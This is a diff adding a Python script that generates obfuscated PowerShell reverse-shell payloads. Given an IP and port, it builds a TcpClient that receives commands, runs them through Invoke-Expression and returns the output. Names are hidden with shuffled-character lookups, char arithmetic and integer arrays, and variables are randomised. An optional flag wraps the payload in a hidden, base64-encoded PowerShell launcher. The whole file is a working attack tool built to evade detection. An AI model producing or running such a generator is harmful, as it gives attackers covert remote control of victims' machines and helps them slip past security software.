@@ -1,0 +1,197 @@
+#!/usr/bin/env python3
+
+import random
+import string
+import sys
+import argparse
+import base64
+
+
+def rand_var(min_len: int = 4, max_len: int = 20) -> str:
+    
+    pool = string.ascii_letters + string.digits
+    first = random.choice(string.ascii_letters)
+    rest = ''.join(random.choices(
+        pool, k=random.randint(min_len - 1, max_len - 1)))
+    return first + rest
+
+
+def shuffled_lookup(target: str) -> str:
+
+    needed = list(dict.fromkeys(target))
+    filler_pool = [c for c in
+                   string.ascii_letters + string.digits + '-_'
+                   if c not in needed]
+    random.shuffle(filler_pool)
+    pad = filler_pool[:random.randint(30, 55)]
+    alphabet = needed + pad
+    random.shuffle(alphabet)
+    alpha_str = ''.join(alphabet)
+
+    indices = []
+    for ch in target:
+        positions = [i for i, c in enumerate(alpha_str) if c == ch]
+        indices.append(random.choice(positions))
+
+    idx_str = ','.join(map(str, indices))
+    return f'("{alpha_str}")[{idx_str}] -join \'\''
+
+
+def char_arithmetic(s: str) -> str:
+    
+    parts = []
+    for ch in s:
+        v = ord(ch)
+        style = random.choice(['mul', 'add'])
+        if style == 'mul' and v != 0:
+            m = random.randint(2, 127)
+            parts.append(f'[char]({m}*{v}/{m})')
+        else:
+            m = random.randint(0, 100)
+            parts.append(f'[char]({m}+{v}-{m})')
+    return '+'.join(parts)
+
+
+def int_array_encode(s: str) -> str:
+    
+    ints = ','.join(str(ord(c)) for c in s)
+    if random.choice([True, False]):
+        inner = (f'([string]::join(\'\', ( ({ints}) '
+                 f'|ForEach-Object{{$_}}|%{{ ( [char][int] $_)}}))'
+                 f'|ForEach-Object{{$_}}| % {{$_}})')
+    else:
+        inner = (f'([string]::join(\'\', ( ({ints}) '
+                 f'|%{{ ( [char][int] $_)}}))'
+                 f'| % {{$_}})')
+    return inner
+
+
+def rand_bufsize() -> str:
+    
+    styles = [
+        '(65535)',
+        '(0-0+65535)',
+        '(65535+0)',
+        '(65536-1)',
+        '(0x0000+65535)',
+    ]
+    return random.choice(styles)
+
+
+def rand_foreach() -> str:
+    
+    opts = [
+        '|ForEach-Object{$_}',
+        '|%{$_}',
+        '|ForEach-Object{$_}|%{$_}',
+    ]
+    return random.choice(opts)
+
+
+def generate(ip: str, port: str) -> str:
+
+    v_client = rand_var()
+    v_stream = rand_var()
+    v_buf = rand_var()
+    v_nread = rand_var()
+    v_text = rand_var()
+    v_result = rand_var()
+    v_prompt = rand_var()
+    v_outbytes = rand_var()
+
+    new_obj_a = shuffled_lookup('New-Object')
+    new_obj_b = shuffled_lookup('New-Object')
+    invoke_expr = shuffled_lookup('Invoke-Expression')
+    out_str = shuffled_lookup('Out-String')
+    get_loc = shuffled_lookup('Get-Location')
+
+    invoke_low = (shuffled_lookup('invoke-expression')
+                  if random.choice([True, False])
+                  else int_array_encode('invoke-expression'))
+
+    tcp_class = char_arithmetic('System.Net.Sockets.TcpClient')
+
+    if random.choice([True, False]):
+        ascii_class = f'$({char_arithmetic("System.Text.ASCIIEncoding")})'
+    else:
+        ascii_class = int_array_encode('System.Text.ASCIIEncoding')
+
+    flush_expr = (f'${v_stream}.Flush()'
+                  if random.choice([True, False])
+                  else f'({int_array_encode(f"${v_stream}.Flush()")})')
+
+    close_expr = int_array_encode(f'${v_client}.Close()')
+
+    buf_expr = rand_bufsize()
+
+    fe1 = rand_foreach()
+    fe2 = rand_foreach()
+    fe3 = rand_foreach()
+
+    if random.choice([True, False]):
+        flush_line = f'    (({flush_expr}))'
+    else:
+        flush_line = (f'    $((& ({invoke_low})'
+                      f'({int_array_encode(f"${v_stream}.Flush()")}) | % {{$_}}))')
+    script = (
+        f'${v_client} = & ({new_obj_a}) '
+        f'$({tcp_class})("{ip}", "{port}");\n'
+
+        f'${v_stream} = (${v_client}.GetStream());'
+        f'[byte[]]${v_buf} = 0..$({buf_expr}){fe1}|%{{0}};\n'
+
+        f'while((${v_nread} = ${v_stream}.Read(${
+            v_buf}, 0, ${v_buf}.Length)) -ne 0){{\n'
+
+        f'    ${v_text} = (& ({new_obj_b}) -TypeName '
+        f'{ascii_class}).GetString(${v_buf},0, ${v_nread});\n'
+
+        f'    ${v_result} = (& ({invoke_expr}) ${v_text} 2>&1 '
+        f'{fe2}| & ({out_str}) );\n'
+
+        f'    ${v_prompt} = ${v_result} + \'PS \' + '
+        f'(& ({get_loc})).Path + \'> \';\n'
+
+        f'    ${v_outbytes} = ([text.encoding]::ASCII).GetBytes(${
+            v_prompt});\n'
+
+        f'    ${v_stream}.Write(${v_outbytes},0,${v_outbytes}.Length);\n'
+
+        f'{flush_line}\n'
+
+        f'}};\n'
+
+        f'$((& ({invoke_low})'
+        f'({close_expr}) | % {{$_}}));'
+    )
+
+    return script
+
+
+def to_b64_launcher(payload: str) -> str:
+
+    encoded = base64.b64encode(payload.encode('utf-16-le')).decode()
+    return f'powershell -NoP -NonI -W Hidden -Enc {encoded}'
+
+
+def main():
+    
+    if len(sys.argv) < 3:
+        print(f"Usage: python3 {sys.argv[0]} <ip> <port> [--b64]")
+        sys.exit(1)
+
+    ip = sys.argv[1]
+    port = sys.argv[2]
+    b64 = "--b64" in sys.argv
+
+    payload = generate(ip, port)
+
+    if b64:
+        launcher = to_b64_launcher(payload)
+        print(launcher)
+    else:
+        print(payload)
+
+
+if __name__ == '__main__':
+    main()
